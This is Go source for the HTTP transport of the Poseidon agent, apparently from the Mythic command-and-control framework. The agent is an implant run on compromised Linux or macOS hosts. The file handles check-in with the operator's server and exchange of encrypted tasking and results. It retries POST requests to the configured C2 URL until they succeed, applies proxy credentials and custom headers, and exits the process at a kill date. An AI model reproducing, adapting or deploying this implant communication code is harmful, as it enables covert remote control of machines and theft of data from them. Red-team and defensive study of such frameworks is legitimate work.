//go:build (linux || darwin) && http

package profiles

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// Include the route UUID and outer base64 envelope in the transport budget.
// Providers remain responsible for their own decoded message limits.
var maxProviderHTTPResponseBytes = base64.StdEncoding.EncodedLen((32 << 20) + 36)

func readProviderHTTPResponse(body io.Reader) ([]byte, error) {
	data, err := io.ReadAll(io.LimitReader(body, int64(maxProviderHTTPResponseBytes)+1))
	if err != nil {
		return nil, err
	}
	if len(data) > maxProviderHTTPResponseBytes {
		return nil, errors.New("HTTP cryptographic provider response exceeds transport limit")
	}
	return data, nil
}

func (c *C2HTTP) providerCheckIn() structs.CheckInMessageResponse {
	for !c.ShouldStop {
		if err := c.cryptoProvider.Register(c.providerRoundTrip); err != nil {
			utils.PrintDebug(fmt.Sprintf("HTTP provider registration failed: %v\n", err))
			if c.cryptoProvider.Failed() {
				c.ShouldStop = true
				return structs.CheckInMessageResponse{}
			}
			c.Sleep()
			continue
		}
		body, err := json.Marshal(CreateCheckinMessage())
		if err != nil {
			c.Sleep()
			continue
		}
		reply, callback, err := c.cryptoProvider.CheckIn(body, c.providerRoundTrip)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("HTTP provider check-in failed: %v\n", err))
			if c.cryptoProvider.Failed() {
				c.ShouldStop = true
				return structs.CheckInMessageResponse{}
			}
			c.Sleep()
			continue
		}
		var result structs.CheckInMessageResponse
		if err = json.Unmarshal(reply, &result); err != nil {
			c.ShouldStop = true
			return structs.CheckInMessageResponse{}
		}
		SetMythicID(callback)
		return result
	}
	return structs.CheckInMessageResponse{}
}

func (c *C2HTTP) providerSendMessage(plaintext []byte) []byte {
	// Delegates remain opaque inside the egress message. Exchange retains the
	// complete plaintext and its ciphertext across retries, including delegated
	// registration, tasking, and responses.
	for !c.ShouldStop {
		response, exchangeErr := c.cryptoProvider.Exchange(plaintext, c.providerRoundTrip)
		if exchangeErr == nil {
			return response
		}
		utils.PrintDebug(fmt.Sprintf("HTTP provider exchange failed: %v\n", exchangeErr))
		if c.cryptoProvider.Failed() {
			c.ShouldStop = true
			return nil
		}
		c.Sleep()
	}
	return nil
}

// Finish an interrupted poll before the restarted profile collects another
// outbound message. The decrypted reply still reaches the normal task handler.
func (c *C2HTTP) providerResumeMessage() []byte {
	for !c.ShouldStop {
		response, err := c.cryptoProvider.Resume(c.providerRoundTrip)
		if err == nil {
			return response
		}
		utils.PrintDebug(fmt.Sprintf("HTTP provider resume failed: %v\n", err))
		if c.cryptoProvider.Failed() {
			c.ShouldStop = true
			return nil
		}
		c.Sleep()
	}
	return nil
}

// providerRoundTrip retries the same complete frame until success or an explicit
// stop. Returning after an arbitrary retry count would discard task responses
// that have already left Poseidon's response queue. The server must retain the
// corresponding response so a lost HTTP reply can be fetched without replaying
// the provider operation.
func (c *C2HTTP) providerRoundTrip(frame []byte) ([]byte, error) {
	if c.providerHTTP == nil {
		transport := tr.Clone()
		if c.ProxyURL != "" {
			proxyURL, err := url.Parse(c.ProxyURL)
			if err != nil {
				return nil, err
			}
			transport.Proxy = http.ProxyURL(proxyURL)
		} else if !c.ProxyBypass {
			transport.Proxy = http.ProxyFromEnvironment
		} else {
			transport.Proxy = nil
		}
		c.providerHTTP = &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
			// Redirects can change POST semantics or expose a pinned-provider
			// registration to an unrelated endpoint. Retry the configured URL.
			CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
		}
	}
	defer c.providerHTTP.CloseIdleConnections()
	for !c.ShouldStop {
		if time.Now().After(c.Killdate) {
			os.Exit(1)
		}
		request, err := http.NewRequest(http.MethodPost, c.BaseURL+c.PostURI, bytes.NewReader(frame))
		if err != nil {
			return nil, err
		}
		for name, value := range c.HeaderList {
			switch name {
			case "Host":
				request.Host = value
			case "Content-Length":
				continue
			default:
				request.Header.Set(name, value)
			}
		}
		if c.ProxyUser != "" && c.ProxyPass != "" {
			request.SetBasicAuth(c.ProxyUser, c.ProxyPass)
			request.Header.Set("Proxy-Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(c.ProxyUser+":"+c.ProxyPass)))
		}
		response, err := c.providerHTTP.Do(request)
		if err != nil {
			c.Sleep()
			continue
		}
		// Bound HTTP response allocation independently of the crypto provider.
		body, readErr := readProviderHTTPResponse(response.Body)
		_ = response.Body.Close()
		if response.StatusCode == http.StatusOK && readErr == nil {
			return body, nil
		}
		c.Sleep()
	}
	return nil, errors.New("HTTP cryptographic provider transport stopped")
}
